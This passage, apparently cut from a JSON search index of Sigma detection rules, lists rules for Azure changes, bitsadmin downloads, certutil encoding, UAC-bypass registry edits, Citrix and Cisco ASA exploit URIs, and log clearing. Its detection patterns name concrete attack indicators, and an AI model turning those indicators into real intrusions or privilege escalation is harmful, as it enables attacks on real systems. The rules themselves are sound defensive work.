448fd1ea-2116-4c62-9cde-a92d120e0f08 description: Identifies when a service principal was removed in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy logsource: product: azure service: azure.activitylogs detection: selection: properties.message: Remove service principal condition: selection level: medium tags: - attack.defense_evasion falsepositives: - Service principal being removed may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service principal removed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_service_principal_removed.yml/","tags":["attack.defense_evasion"],"title":"Azure Service Principal Removed"},{"categories":null,"contents":"Identifies when a virtual network device is being modified or deleted. This can be a network interface, network virtual appliance, virtual hub, or virtual router.\nKnown false-positives Virtual Network Device being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Virtual Network Device modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Virtual Network Device Modified or Deleted id: 15ef3fac-f0f0-4dc4-ada0-660aa72980b3 description: Identifies when a virtual network device is being modified or deleted. This can be a network interface, network virtual appliance, virtual hub, or virtual router. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/NETWORKINTERFACES/TAPCONFIGURATIONS/WRITE - MICROSOFT.NETWORK/NETWORKINTERFACES/TAPCONFIGURATIONS/DELETE - MICROSOFT.NETWORK/NETWORKINTERFACES/WRITE - MICROSOFT.NETWORK/NETWORKINTERFACES/JOIN/ACTION - MICROSOFT.NETWORK/NETWORKINTERFACES/DELETE - MICROSOFT.NETWORK/NETWORKVIRTUALAPPLIANCES/DELETE - MICROSOFT.NETWORK/NETWORKVIRTUALAPPLIANCES/WRITE - MICROSOFT.NETWORK/VIRTUALHUBS/DELETE - MICROSOFT.NETWORK/VIRTUALHUBS/WRITE - MICROSOFT.NETWORK/VIRTUALROUTERS/WRITE - MICROSOFT.NETWORK/VIRTUALROUTERS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Virtual Network Device being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Virtual Network Device modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_network_virtual_device_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Virtual Network Device Modified or Deleted"},{"categories":null,"contents":"Identifies when a Virtual Network is modified or deleted in Azure.\nKnown false-positives Virtual Network being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Virtual Network modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure Virtual Network Modified or Deleted id: bcfcc962-0e4a-4fd9-84bb-a833e672df3f description: Identifies when a Virtual Network is modified or deleted in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message|startswith: - MICROSOFT.NETWORK/VIRTUALNETWORKGATEWAYS/ - MICROSOFT.NETWORK/VIRTUALNETWORKS/ properties.message|endswith: - /WRITE - /DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Virtual Network being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Virtual Network modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_virtual_network_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Virtual Network Modified or Deleted"},{"categories":null,"contents":"Identifies when a VPN connection is modified or deleted.\nKnown false-positives VPN Connection being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. VPN Connection modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure VPN Connection Modified or Deleted id: 61171ffc-d79c-4ae5-8e10-9323dba19cd3 description: Identifies when a VPN connection is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/WRITE - MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - VPN Connection being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - VPN Connection modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_vpn_connection_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Azure VPN Connection Modified or Deleted"},{"categories":null,"contents":"Detects Baby Shark C2 Framework communication patterns\nKnown false-positives Unknown References https://nasbench.medium.com/understanding-detecting-c2-frameworks-babyshark-641be4595845 Raw rule (edit) title: BabyShark Agent Pattern id: 304810ed-8853-437f-9e36-c4975c3dfd7e status: experimental description: Detects Baby Shark C2 Framework communication patterns author: Florian Roth date: 2021/06/09 references: - https://nasbench.medium.com/understanding-detecting-c2-frameworks-babyshark-641be4595845 logsource: category: proxy detection: selection: c-uri|contains: \u0026#39;momyshark?key=\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_baby_shark.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"BabyShark Agent Pattern"},{"categories":null,"contents":"Detects base64 encoded listing Win32_Shadowcopy\nKnown false-positives Unlikely References https://github.com/Neo23x0/Raccine/blob/main/yara/mal_revil.yar Raw rule (edit) title: Base64 Encoded Listing of Shadowcopy id: 47688f1b-9f51-4656-b013-3cc49a166a36 status: test description: Detects base64 encoded listing Win32_Shadowcopy author: Christian Burkard date: 2022/03/01 modified: 2022/03/07 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - https://github.com/Neo23x0/Raccine/blob/main/yara/mal_revil.yar logsource: category: process_creation product: windows detection: selection: # Win32_Shadowcopy | ForEach-Object CommandLine|contains: - \u0026#39;VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQA\u0026#39; - \u0026#39;cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A\u0026#39; - \u0026#39;XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdA\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_base64_listing_shadowcopy.yml/","tags":["attack.execution","attack.t1059.001","attack.defense_evasion","attack.t1027"],"title":"Base64 Encoded Listing of Shadowcopy"},{"categories":null,"contents":"Detects base64 encoded .NET reflective loading of Assembly\nKnown false-positives Unlikely References https://github.com/Neo23x0/Raccine/blob/main/yara/mal_revil.yar Raw rule (edit) title: Base64 Encoded Reflective Assembly Load id: 62b7ccc9-23b4-471e-aa15-6da3663c4d59 status: test description: Detects base64 encoded .NET reflective loading of Assembly author: Christian Burkard date: 2022/03/01 modified: 2022/03/07 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - https://github.com/Neo23x0/Raccine/blob/main/yara/mal_revil.yar logsource: category: process_creation product: windows detection: selection: # [Reflection.Assembly]::Load( CommandLine|contains: - \u0026#39;WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\u0026#39; - \u0026#39;sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\u0026#39; - \u0026#39;bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_base64_reflective_assembly_load.yml/","tags":["attack.execution","attack.t1059.001","attack.defense_evasion","attack.t1027"],"title":"Base64 Encoded Reflective Assembly Load"},{"categories":null,"contents":"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.\nKnown false-positives Legitimate script work References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md Raw rule (edit) title: \u0026#39;Binary Padding\u0026#39; id: c52a914f-3d8b-4b2a-bb75-b3991e75f8ba status: test description: \u0026#39;Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.\u0026#39; author: \u0026#39;Igor Fits, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md date: 2020/10/13 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: \u0026#39;EXECVE\u0026#39; truncate: - \u0026#39;truncate\u0026#39; - \u0026#39;-s\u0026#39; dd: - \u0026#39;dd\u0026#39; - \u0026#39;if=\u0026#39; filter: - \u0026#39;of=\u0026#39; condition: execve and (all of truncate or (all of dd and not filter)) falsepositives: - \u0026#39;Legitimate script work\u0026#39; level: high tags: - attack.defense_evasion - attack.t1027.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_binary_padding.yml/","tags":["attack.defense_evasion","attack.t1027.001"],"title":"Binary Padding"},{"categories":null,"contents":"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.\nKnown false-positives Legitimate script work References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md Raw rule (edit) title: \u0026#39;Binary Padding\u0026#39; id: 95361ce5-c891-4b0a-87ca-e24607884a96 status: test description: \u0026#39;Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.\u0026#39; author: \u0026#39;Igor Fits, Mikhail Larin, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md date: 2020/10/19 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection1: Image|endswith: - \u0026#39;/truncate\u0026#39; CommandLine|contains: - \u0026#39;-s\u0026#39; selection2: Image|endswith: - \u0026#39;/dd\u0026#39; CommandLine|contains: - \u0026#39;if=\u0026#39; filter: CommandLine|contains: \u0026#39;of=\u0026#39; condition: selection1 or (selection2 and not filter) falsepositives: - \u0026#39;Legitimate script work\u0026#39; level: high tags: - attack.defense_evasion - attack.t1027.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_binary_padding.yml/","tags":["attack.defense_evasion","attack.t1027.001"],"title":"Binary Padding"},{"categories":null,"contents":"Detects usage of bitsadmin downloading a file\nKnown false-positives Some legitimate apps use this, but limited. References https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin https://isc.sans.edu/diary/22264 https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/ Raw rule (edit) title: Bitsadmin Download id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede status: experimental description: Detects usage of bitsadmin downloading a file references: - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin - https://isc.sans.edu/diary/22264 - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/ tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 - attack.t1036.003 date: 2017/03/09 modified: 2021/07/16 author: Michael Haag, FPT.EagleEye logsource: category: process_creation product: windows detection: selection1: Image|endswith: - \u0026#39;\\bitsadmin.exe\u0026#39; susp_flag_1: CommandLine|contains: - \u0026#39; /transfer \u0026#39; susp_flag_2: CommandLine|contains: - \u0026#39; /create \u0026#39; - \u0026#39; /addfile \u0026#39; http_flag: CommandLine|contains: - \u0026#39;http\u0026#39; selection2: CommandLine|contains: - \u0026#39;copy bitsadmin.exe\u0026#39; condition: (selection1 and susp_flag_2 and http_flag) or (selection1 and susp_flag_1) or selection2 fields: - CommandLine - ParentCommandLine falsepositives: - Some legitimate apps use this, but limited. level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml/","tags":["attack.defense_evasion","attack.persistence","attack.t1197","attack.s0190","attack.t1036.003"],"title":"Bitsadmin Download"},{"categories":null,"contents":"Detects Bitsadmin connections to domains with uncommon TLDs - https://twitter.com/jhencinski/status/1102695118455349248 - https://isc.sans.edu/forums/diary/Investigating+Microsoft+BITS+Activity/23281/\nKnown false-positives Rare programs that use Bitsadmin and update from regional TLDs e.g. .uk or .ca Raw rule (edit) title: Bitsadmin to Uncommon TLD id: 9eb68894-7476-4cd6-8752-23b51f5883a7 status: experimental description: Detects Bitsadmin connections to domains with uncommon TLDs - https://twitter.com/jhencinski/status/1102695118455349248 - https://isc.sans.edu/forums/diary/Investigating+Microsoft+BITS+Activity/23281/ author: Florian Roth date: 2019/03/07 modified: 2021/08/09 logsource: category: proxy detection: selection: c-useragent|startswith: \u0026#39;Microsoft BITS/\u0026#39; falsepositives: r-dns|endswith: - \u0026#39;.com\u0026#39; - \u0026#39;.net\u0026#39; - \u0026#39;.org\u0026#39; condition: selection and not falsepositives fields: - ClientIP - c-uri - c-useragent falsepositives: - Rare programs that use Bitsadmin and update from regional TLDs e.g. .uk or .ca level: high tags: - attack.command_and_control - attack.t1071.001 - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ua_bitsadmin_susp_tld.yml/","tags":["attack.command_and_control","attack.t1071.001","attack.defense_evasion","attack.persistence","attack.t1197","attack.s0190"],"title":"Bitsadmin to Uncommon TLD"},{"categories":null,"contents":"Detects buffer overflow attempts in Unix system log files\nKnown false-positives Unknown References https://github.com/ossec/ossec-hids/blob/master/etc/rules/attack_rules.xml Raw rule (edit) title: Buffer Overflow Attempts id: 18b042f0-2ecd-4b6e-9f8d-aa7a7e7de781 status: stable description: Detects buffer overflow attempts in Unix system log files author: Florian Roth date: 2017/03/01 references: - https://github.com/ossec/ossec-hids/blob/master/etc/rules/attack_rules.xml logsource: product: unix detection: keywords: - \u0026#39;attempt to execute code on stack by\u0026#39; - \u0026#39;FTP LOGIN FROM .* 0bin0sh\u0026#39; - \u0026#39;rpc.statd[\\d+]: gethostbyname error for\u0026#39; - \u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.t1068 - attack.privilege_escalation ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_buffer_overflows.yml/","tags":["attack.t1068","attack.privilege_escalation"],"title":"Buffer Overflow Attempts"},{"categories":null,"contents":"Bypasses User Account Control using a fileless method\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand https://devblogs.microsoft.com/oldnewthing/20100312-01/?p=14623 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-7---bypass-uac-using-sdclt-delegateexecute Raw rule (edit) title: Bypass UAC Using DelegateExecute id: 46dd5308-4572-4d12-aa43-8938f0184d4f description: Bypasses User Account Control using a fileless method author: frack113 date: 2022/01/05 status: experimental references: - https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand - https://devblogs.microsoft.com/oldnewthing/20100312-01/?p=14623 - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-7---bypass-uac-using-sdclt-delegateexecute logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|endswith: \\open\\command\\DelegateExecute Details: (Empty) condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_bypass_uac_using_delegateexecute.yml/","tags":["attack.privilege_escalation","attack.defense_evasion","attack.t1548.002"],"title":"Bypass UAC Using DelegateExecute"},{"categories":null,"contents":"Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification\nKnown false-positives Unknown References https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-1---bypass-uac-using-event-viewer-cmd Raw rule (edit) title: Bypass UAC Using Event Viewer id: 674202d0-b22a-4af4-ae5f-2eda1f3da1af description: Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification author: frack113 date: 2022/01/05 status: experimental references: - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-1---bypass-uac-using-event-viewer-cmd logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|endswith: \u0026#39;_Classes\\mscfile\\shell\\open\\command\\(Default)\u0026#39; filter: Details: \u0026#39;%SystemRoot%\\system32\\mmc.exe \u0026#34;%1\u0026#34; %*\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.010 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_bypass_uac_using_eventviewer.yml/","tags":["attack.persistence","attack.t1547.010"],"title":"Bypass UAC Using Event Viewer"},{"categories":null,"contents":"There is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-9---bypass-uac-using-silentcleanup-task https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/ Raw rule (edit) title: Bypass UAC Using SilentCleanup Task id: 724ea201-6514-4f38-9739-e5973c34f49a description: There is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC author: frack113 date: 2022/01/06 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-9---bypass-uac-using-silentcleanup-task - https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/ logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: \u0026#39;\\Environment\\windir\u0026#39; Details|contains: \u0026#39;\u0026amp;REM\u0026#39; EventType: SetValue condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_bypass_uac_using_silentcleanup_task.yml/","tags":["attack.privilege_escalation","attack.defense_evasion","attack.t1548.002"],"title":"Bypass UAC Using SilentCleanup Task"},{"categories":null,"contents":"Detects remote thread creation from CACTUSTORCH as described in references.\nKnown false-positives unknown References https://twitter.com/SBousseaden/status/1090588499517079552 https://github.com/mdsecactivebreach/CACTUSTORCH Raw rule (edit) title: CACTUSTORCH Remote Thread Creation id: 2e4e488a-6164-4811-9ea1-f960c7359c40 description: Detects remote thread creation from CACTUSTORCH as described in references. references: - https://twitter.com/SBousseaden/status/1090588499517079552 - https://github.com/mdsecactivebreach/CACTUSTORCH status: experimental author: \u0026#39;@SBousseaden (detection), Thomas Patzke (rule)\u0026#39; date: 2019/02/01 modified: 2021/11/12 logsource: product: windows category: create_remote_thread detection: selection: SourceImage|endswith: - \u0026#39;\\System32\\cscript.exe\u0026#39; - \u0026#39;\\System32\\wscript.exe\u0026#39; - \u0026#39;\\System32\\mshta.exe\u0026#39; - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; TargetImage|contains: \u0026#39;\\SysWOW64\\\u0026#39; StartModule: null condition: selection tags: - attack.defense_evasion - attack.t1055.012 - attack.execution - attack.t1059.005 - attack.t1059.007 - attack.t1218.005 falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_remote_thread/sysmon_cactustorch.yml/","tags":["attack.defense_evasion","attack.t1055.012","attack.execution","attack.t1059.005","attack.t1059.007","attack.t1218.005"],"title":"CACTUSTORCH Remote Thread Creation"},{"categories":null,"contents":"Detects suspicious a certutil command that used to encode files, which is sometimes used for data exfiltration\nKnown false-positives unknown References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ Raw rule (edit) title: Certutil Encode id: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a status: test description: Detects suspicious a certutil command that used to encode files, which is sometimes used for data exfiltration author: Florian Roth, Jonhnathan Ribeiro, oscd.community references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ date: 2019/02/24 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\certutil.exe\u0026#39; CommandLine|contains|all: - \u0026#39;-f\u0026#39; - \u0026#39;-encode\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.defense_evasion - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_certutil_encode.yml/","tags":["attack.defense_evasion","attack.t1027"],"title":"Certutil Encode"},{"categories":null,"contents":"Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md#atomic-test-1---rdp-to-domaincontroller Raw rule (edit) title: Changing RDP Port to Non Standard Number id: 509e84b9-a71a-40e0-834f-05470369bd1e description: | Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). author: frack113 date: 2022/01/01 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md#atomic-test-1---rdp-to-domaincontroller logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject: HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\PortNumber filter: Details: DWORD (0x00000d3d) condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.010 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_change_rdp_port.yml/","tags":["attack.persistence","attack.t1547.010"],"title":"Changing RDP Port to Non Standard Number"},{"categories":null,"contents":"Detects exploitation attempts on Cisco ASA FTD systems exploiting CVE-2020-3452 with a status code of 200 (sccessful exploitation)\nKnown false-positives Unknown References https://twitter.com/aboul3la/status/1286012324722155525 https://github.com/darklotuskdb/CISCO-CVE-2020-3452-Scanner-Exploiter Raw rule (edit) title: Cisco ASA FTD Exploit CVE-2020-3452 id: aba47adc-4847-4970-95c1-61dce62a8b29 status: experimental description: Detects exploitation attempts on Cisco ASA FTD systems exploiting CVE-2020-3452 with a status code of 200 (sccessful exploitation) author: Florian Roth date: 2021/01/07 references: - https://twitter.com/aboul3la/status/1286012324722155525 - https://github.com/darklotuskdb/CISCO-CVE-2020-3452-Scanner-Exploiter logsource: category: webserver detection: selection_endpoint: c-uri|contains: - \u0026#39;+CSCOT+/translation-table\u0026#39; - \u0026#39;+CSCOT+/oem-customization\u0026#39; selection_path_select: c-uri|contains: - \u0026#39;\u0026amp;textdomain=/\u0026#39; - \u0026#39;\u0026amp;textdomain=%\u0026#39; - \u0026#39;\u0026amp;name=/\u0026#39; - \u0026#39;\u0026amp;name=%\u0026#39; select_status_code: sc-status: 200 condition: selection_endpoint and selection_path_select and select_status_code fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.t1190 - attack.initial_access - cve.2020.3452 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2020_3452_cisco_asa_ftd.yml/","tags":["attack.t1190","attack.initial_access","cve.2020.3452"],"title":"Cisco ASA FTD Exploit CVE-2020-3452"},{"categories":null,"contents":"Detects CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller and Citrix Gateway Attack\nKnown false-positives Unknown References https://support.citrix.com/article/CTX267679 https://support.citrix.com/article/CTX267027 https://isc.sans.edu/diary/25686 https://twitter.com/mpgn_x64/status/1216787131210829826 https://github.com/x1sec/x1sec.github.io/blob/master/CVE-2019-19781-DFIR.md Raw rule (edit) title: Citrix Netscaler Attack CVE-2019-19781 id: ac5a6409-8c89-44c2-8d64-668c29a2d756 status: test description: Detects CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller and Citrix Gateway Attack author: Arnim Rupp, Florian Roth references: - https://support.citrix.com/article/CTX267679 - https://support.citrix.com/article/CTX267027 - https://isc.sans.edu/diary/25686 - https://twitter.com/mpgn_x64/status/1216787131210829826 - https://github.com/x1sec/x1sec.github.io/blob/master/CVE-2019-19781-DFIR.md date: 2020/01/02 modified: 2021/11/27 logsource: category: webserver definition: \u0026#39;Make sure that your Netscaler appliance logs all kinds of attacks (test with http://your-citrix-gw.net/robots.txt). The directory traversal with ../ might not be needed on certain cloud instances or for authenticated users, so we also check for direct paths. All scripts in portal/scripts are exploitable except logout.pl.\u0026#39; detection: selection: c-uri: - \u0026#39;*/../vpns/*\u0026#39; - \u0026#39;*/vpns/cfg/smb.conf\u0026#39; - \u0026#39;*/vpns/portal/scripts/*.pl*\u0026#39; condition: selection fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_citrix_cve_2019_19781_exploit.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Citrix Netscaler Attack CVE-2019-19781"},{"categories":null,"contents":"Detects clear logs\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.002/T1070.002.md Raw rule (edit) title: Clear Linux Logs id: 80915f59-9b56-4616-9de0-fd0dea6c12fe status: stable description: Detects clear logs author: Ömer Günal, oscd.community date: 2020/10/07 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.002/T1070.002.md logsource: product: linux category: process_creation detection: selection: Image|endswith: - \u0026#39;/rm\u0026#39; # covers /rmdir as well - \u0026#39;/shred\u0026#39; CommandLine|contains: - \u0026#39;/var/log\u0026#39; - \u0026#39;/var/spool/mail\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: medium tags: - attack.defense_evasion - attack.t1070.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_clear_logs.yml/","tags":["attack.defense_evasion","attack.t1070.002"],"title":"Clear Linux Logs"},{"categories":null,"contents":"Detects attempts to collect image data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\nKnown false-positives Legitimate usage of xclip tools References https://attack.mitre.org/techniques/T1115/ https://linux.die.net/man/1/xclip Raw rule (edit) title: Clipboard Collection of Image Data with Xclip Tool id: f200dc3f-b219-425d-a17e-c38467364816 description: Detects attempts to collect image data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations. author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/10/01 references: - https://attack.mitre.org/techniques/T1115/ - https://linux.die.net/man/1/xclip logsource: product: linux service: auditd detection: xclip: type: EXECVE a0: xclip a1: - \u0026#39;-selection\u0026#39; - \u0026#39;-sel\u0026#39; a2: - clipboard - clip a3: \u0026#39;-t\u0026#39; a4|startswith: \u0026#39;image/\u0026#39; a5: \u0026#39;-o\u0026#39; condition: xclip tags: - attack.collection - attack.t1115 falsepositives: - Legitimate usage of xclip tools level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_clipboard_image_collection.yml/","tags":["attack.collection","attack.t1115"],"title":"Clipboard Collection of Image Data with Xclip Tool"},{"categories":null,"contents":"Detects CLR DLL being loaded by an scripting applications\nKnown false-positives unknown References https://github.com/tyranid/DotNetToJScript https://thewover.github.io/Introducing-Donut/ 